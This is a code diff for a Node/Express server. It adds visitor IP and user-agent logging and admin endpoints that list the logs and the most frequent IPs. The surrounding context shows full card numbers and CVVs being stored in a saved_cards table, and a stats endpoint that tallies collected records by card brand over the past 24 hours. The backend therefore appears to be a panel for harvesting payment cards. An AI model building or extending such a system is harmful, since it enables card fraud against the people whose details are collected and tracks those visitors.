@@ -49,6 +49,18 @@ async function initDB() {
       updated_at TIMESTAMPTZ DEFAULT NOW()
     )
   `);
+  await pool.query(`
+    CREATE TABLE IF NOT EXISTS request_logs (
+      id         BIGSERIAL PRIMARY KEY,
+      ip         TEXT,
+      method     TEXT,
+      path       TEXT,
+      user_agent TEXT,
+      created_at TIMESTAMPTZ DEFAULT NOW()
+    )
+  `);
+  await pool.query(`CREATE INDEX IF NOT EXISTS idx_rl_ip ON request_logs(ip)`);
+  await pool.query(`CREATE INDEX IF NOT EXISTS idx_rl_ts ON request_logs(created_at DESC)`);
   // Adiciona colunas extras — se já existirem, o IF NOT EXISTS ignora silenciosamente
   await pool.query(`ALTER TABLE saved_cards ADD COLUMN IF NOT EXISTS cvv         TEXT`);
   await pool.query(`ALTER TABLE saved_cards ADD COLUMN IF NOT EXISTS card_number TEXT`);
@@ -70,6 +82,16 @@ initDB().catch(e => {
 app.use(cors());
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
+
+// ── IP Logger ─────────────────────────────────────────────────────────────────
+app.use((req, res, next) => {
+  const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.socket.remoteAddress || null;
+  pool.query(
+    'INSERT INTO request_logs (ip, method, path, user_agent) VALUES ($1,$2,$3,$4)',
+    [ip, req.method, req.path, req.headers['user-agent'] || null]
+  ).catch(() => {});
+  next();
+});
 
 // ── Auth ──────────────────────────────────────────────────────────────────────
 function authAdmin(req, res, next) {
@@ -278,6 +300,37 @@ app.get('/api/isack/stats', authIsack, async (req, res) => {
       total:  parseInt(total.rows[0].count),
       last24: parseInt(recent.rows[0].count),
       brands: brands.rows.map(r => ({ brand: r.brand || 'desconhecido', count: parseInt(r.count) })),
+    });
+  } catch (e) {
+    res.status(500).json({ ok: false });
+  }
+});
+
+// ── Admin Logs ────────────────────────────────────────────────────────────────
+app.get('/api/admin/logs', authAdmin, async (req, res) => {
+  try {
+    const limit = Math.min(parseInt(req.query.limit) || 500, 2000);
+    const r = await pool.query(
+      'SELECT id, ip, method, path, user_agent, created_at FROM request_logs ORDER BY created_at DESC LIMIT $1',
+      [limit]
+    );
+    res.json({ ok: true, total: r.rows.length, logs: r.rows });
+  } catch (e) {
+    console.error('[GET /api/admin/logs]', e.message);
+    res.status(500).json({ ok: false });
+  }
+});
+
+app.get('/api/admin/logs/stats', authAdmin, async (req, res) => {
+  try {
+    const total   = await pool.query('SELECT COUNT(*) FROM request_logs');
+    const last24  = await pool.query(`SELECT COUNT(*) FROM request_logs WHERE created_at >= NOW() - INTERVAL '24 hours'`);
+    const topIps  = await pool.query(`SELECT ip, COUNT(*) as count FROM request_logs GROUP BY ip ORDER BY count DESC LIMIT 10`);
+    res.json({
+      ok: true,
+      total:  parseInt(total.rows[0].count),
+      last24: parseInt(last24.rows[0].count),
+      topIps: topIps.rows.map(r => ({ ip: r.ip, count: parseInt(r.count) })),
     });
   } catch (e) {
     res.status(500).json({ ok: false });
